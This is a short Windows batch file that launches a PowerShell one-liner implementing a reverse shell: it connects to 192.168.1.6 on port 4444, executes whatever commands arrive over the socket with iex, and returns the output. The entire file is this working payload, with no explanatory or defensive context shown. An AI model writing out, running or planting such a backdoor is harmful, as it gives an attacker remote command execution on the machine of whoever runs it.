@echo off
powershell.exe -Command "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.6', 4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object Text.UTF8Encoding).GetString($bytes, 0, $i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush() }; $client.Close()"
pause
